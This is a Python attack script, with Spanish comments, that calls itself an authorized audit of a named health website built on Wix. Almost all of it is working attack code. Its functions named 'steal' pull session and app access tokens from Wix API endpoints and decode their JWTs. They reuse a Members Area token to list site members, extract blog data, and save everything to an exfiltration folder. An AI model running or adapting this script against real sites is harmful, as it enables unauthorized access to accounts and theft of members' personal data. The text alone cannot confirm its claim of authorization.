#!/usr/bin/env python3
"""
EXFILTRACION DE TOKENS WIX - CORS Misconfiguration
Auditoria Autorizada - Cuidarte Tu Salud

Explota Access-Control-Allow-Origin: * en el sitio Wix
para robar tokens, listar miembros, y extraer datos internos.

Uso:
  python3 07_wix_token_steal.py
"""

import requests
import json
import base64
import os
import time

TARGET = "https://www.cuidartetusalud.com"
OUT_DIR = "./wix_exfil"
os.makedirs(OUT_DIR, exist_ok=True)


def decode_jwt_payload(token):
    """Decodifica el payload de un JWT sin verificar firma."""
    try:
        parts = token.split(".")
        if len(parts) >= 2:
            payload = parts[1] + "=" * (4 - len(parts[1]) % 4)
            return json.loads(base64.b64decode(payload))
    except Exception:
        pass
    return None


def steal_tokens():
    """Roba tokens del endpoint access-tokens."""
    print("[*] Robando tokens de /_api/v1/access-tokens...")
    r = requests.get(f"{TARGET}/_api/v1/access-tokens", timeout=15)

    if r.status_code != 200:
        print(f"[-] Error: HTTP {r.status_code}")
        return None

    data = r.json()
    print(f"[+] visitorId: {data.get('visitorId', 'N/A')}")
    print(f"[+] metaSiteId: {data.get('metaSiteId', 'N/A')}")
    print(f"[+] svSession: {data.get('svSession', 'N/A')[:60]}...")
    print(f"[+] ctToken: {data.get('ctToken', 'N/A')[:60]}...")

    # Decodificar mediaAuthToken
    mat = data.get("mediaAuthToken", "")
    if mat:
        jwt = decode_jwt_payload(mat)
        if jwt:
            print(f"[+] mediaAuthToken JWT:")
            print(f"    iss: {jwt.get('iss')}")
            print(f"    sub: {jwt.get('sub')}")
            print(f"    aud: {jwt.get('aud')}")

    apps = data.get("apps", {})
    print(f"\n[+] Apps con accessToken: {len(apps)}")

    # Guardar
    with open(os.path.join(OUT_DIR, "access_tokens.json"), "w") as f:
        json.dump(data, f, indent=2)

    return data


def steal_dynamic_model():
    """Roba el dynamicmodel."""
    print("\n[*] Robando /_api/v2/dynamicmodel...")
    r = requests.get(f"{TARGET}/_api/v2/dynamicmodel", timeout=15)

    if r.status_code != 200:
        print(f"[-] Error: HTTP {r.status_code}")
        return None

    data = r.json()
    apps = data.get("apps", {})
    print(f"[+] Apps en dynamicmodel: {len(apps)}")
    print(f"[+] Visitor: {data.get('visitorId', 'N/A')}")

    with open(os.path.join(OUT_DIR, "dynamicmodel.json"), "w") as f:
        json.dump(data, f, indent=2)

    return data


def steal_members(tokens_data):
    """Intenta listar miembros con token robado."""
    print("\n[*] Intentando listar miembros (IDOR)...")
    apps = tokens_data.get("apps", {})

    # Buscar token de Members Area
    members_token = None
    for app_id, app_data in apps.items():
        if app_data.get("intId") == 14976:
            members_token = app_data.get("accessToken")
            break

    if not members_token:
        print("[-] Token de Members Area no encontrado")
        return None

    print("[+] Token de Members Area obtenido")

    headers = {"Authorization": members_token}
    r = requests.get(f"{TARGET}/_api/members/v1/members",
                     headers=headers, timeout=15)

    if r.status_code != 200:
        print(f"[-] Error: HTTP {r.status_code}")
        return None

    data = r.json()
    members = data.get("members", [])
    total = data.get("metadata", {}).get("total", len(members))

    print(f"[+] MIEMBROS ENCONTRADOS: {total}")
    for m in members:
        profile = m.get("profile", {})
        print(f"    ID: {m.get('id')}")
        print(f"    contactId: {m.get('contactId')}")
        print(f"    Nickname: {profile.get('nickname')}")
        print(f"    Slug: {profile.get('slug')}")
        print(f"    Creado: {m.get('createdDate')}")
        print()

    with open(os.path.join(OUT_DIR, "members.json"), "w") as f:
        json.dump(data, f, indent=2)

    return data


def steal_blog(tokens_data):
    """Extrae posts del blog con metadatos internos."""
    print("\n[*] Extrayendo blog posts...")
    apps = tokens_data.get("apps", {})

    blog_token = None
    for app_id, app_data in apps.items():
        if app_data.get("intId") == 5347:
            blog_token = app_data.get("accessToken")
            break

    headers = {"Authorization": blog_token} if blog_token else {}
    r = requests.get(
        f"{TARGET}/_api/communities-blog-node-api/_api/posts?offset=0&size=50",
        headers=headers, timeout=15
    )

    if r.status_code != 200:
        print(f"[-] Error: HTTP {r.status_code}")
        return None

    posts = r.json()
    if isinstance(posts, list):
        print(f"[+] Posts obtenidos: {len(posts)}")
        total_views = 0
        for p in posts:
            views = p.get("viewCount", 0)
            total_views += views
            print(f"    [{views} views] {p.get('title', 'Sin titulo')}")
            print(f"      Owner: {p.get('ownerSiteMemberId', 'N/A')}")
        print(f"\n[+] Total views: {total_views}")
    else:
        print(f"[+] Respuesta: {type(posts)}")

    with open(os.path.join(OUT_DIR, "blog_posts.json"), "w") as f:
        json.dump(posts, f, indent=2)

    return posts


def analyze_all_tokens(tokens_data):
    """Analiza y clasifica todos los tokens de apps."""
    print("\n[*] Analizando tokens de todas las apps...")
    apps = tokens_data.get("apps", {})

    report = []
    for app_id, app_data in apps.items():
        int_id = app_data.get("intId", "N/A")
        at = app_data.get("accessToken", "")
        jwt = decode_jwt_payload(at)

        entry = {
            "appDefId": app_id,
            "intId": int_id,
            "instanceId": jwt.get("instanceId", "") if jwt else "",
            "vendorProductId": jwt.get("vendorProductId", "") if jwt else "",
        }
        report.append(entry)

    report.sort(key=lambda x: str(x["intId"]))

    with open(os.path.join(OUT_DIR, "app_inventory.json"), "w") as f:
        json.dump(report, f, indent=2)

    print(f"[+] {len(report)} apps inventariadas en app_inventory.json")
    return report


def main():
    print("=" * 70)
    print(" EXFILTRACION COMPLETA - Wix CORS Misconfiguration")
    print(" Auditoria Autorizada - Cuidarte Tu Salud")
    print("=" * 70)
    print(f"[*] Target: {TARGET}")
    print(f"[*] Fecha: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    tokens = steal_tokens()
    if not tokens:
        print("[-] No se pudieron obtener tokens. Abortando.")
        return

    dm = steal_dynamic_model()
    members = steal_members(tokens)
    blog = steal_blog(tokens)
    inventory = analyze_all_tokens(tokens)

    print("\n" + "=" * 70)
    print(" RESUMEN DE EXFILTRACION")
    print("=" * 70)
    print(f"[+] Tokens globales: 5 (svSession, ctToken, mediaAuthToken, visitorId, metaSiteId)")
    print(f"[+] Apps con tokens: {len(tokens.get('apps', {}))}")
    print(f"[+] Miembros: {len(members.get('members', [])) if members else 'N/A'}")
    print(f"[+] Blog posts: {len(blog) if isinstance(blog, list) else 'N/A'}")
    print(f"\n[+] Todos los datos en: {OUT_DIR}/")
    print(f"[+] Tamano total exfiltrado: {sum(os.path.getsize(os.path.join(OUT_DIR, f)) for f in os.listdir(OUT_DIR)) / 1024:.1f} KB")


if __name__ == "__main__":
    main()
